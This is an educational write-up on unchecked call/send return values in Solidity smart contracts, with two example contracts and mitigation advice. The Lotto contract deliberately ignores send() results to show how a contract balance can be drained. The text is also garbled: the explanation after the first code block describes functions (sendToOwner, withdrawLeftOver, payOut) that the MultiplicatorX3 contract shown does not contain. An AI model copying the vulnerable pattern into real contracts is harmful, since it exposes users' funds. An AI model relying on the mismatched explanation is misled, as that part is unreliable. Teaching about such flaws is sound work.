## Unchecked Call return Values

A common pattern in smart contract development is to use certain checks to validate control logic such as using require to ensure that certain logic or condition is met before execution can continue in a function call. This is important as it ensures that certain errors or unwanted or potentially risky situations are averted . A common check is the Address[0] check that ensures that inputted address is not the zero address.

This pattern is also embedded when using the transfer() to send value, as the transaction that executes using transfer() will revert if the call isn't successful. This is the desired behaviour many will expect from a smart contract: to revert when an action is unsuccesful. But this isn't always the case as solidity have other method of sending values such as using the call() or send()

The functions when used to send values will return a boolean indicating when the action was successful or not. the transaction will not revert and hence execution flow will continue irrespective of whether the action was successful or not. This scenario can also be exploited as an attacker can trick the contract, so that those call will return false and hence continue with an exploitable scenario if such is made available.

A typical example can be gotten from a simple lottery contract

```
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}
```

in the example above, from the sendToOwner(), if by any means the call to send() fails, execution will continue, setting payOut to "true" (even if the caller wasn't actually paid). This then allows the user to call the withdrawLeftOver() and thereby empty the contract balance.

#### Actual Scenario
A real world example was with etherpot and king of the ether, which were lottery contracts built on ethereum, an exploitable unchecked value scenario was discovered in the contract code
```
contract Lotto {

    bool public payedOut = false;
    address public winner;
    uint public winAmount;

    // ... extra functionality here

    function sendToWinner() public {
        require(!payedOut);
        winner.send(winAmount);
        payedOut = true;
    }

    function withdrawLeftOver() public {
        require(payedOut);
        msg.sender.send(this.balance);
    }
}

```

where similar to the example given, a call to send wasn't checked, and after that, the round was marked as cashed by setting it to true.

#### Mitigation
A robust approach to solving this issue would be to make use of a withdrawal patter, where instead of letting the contract transfer out money, the user is responsible for calling a function that then lets them withdraw their winings. this puts the responsibility of handling transaction states in the hands of the user leaving the rest of the code unaffected.

Another solution would be to always check the status of transaction when using call() and afterwards perform certain logic when the result is successful.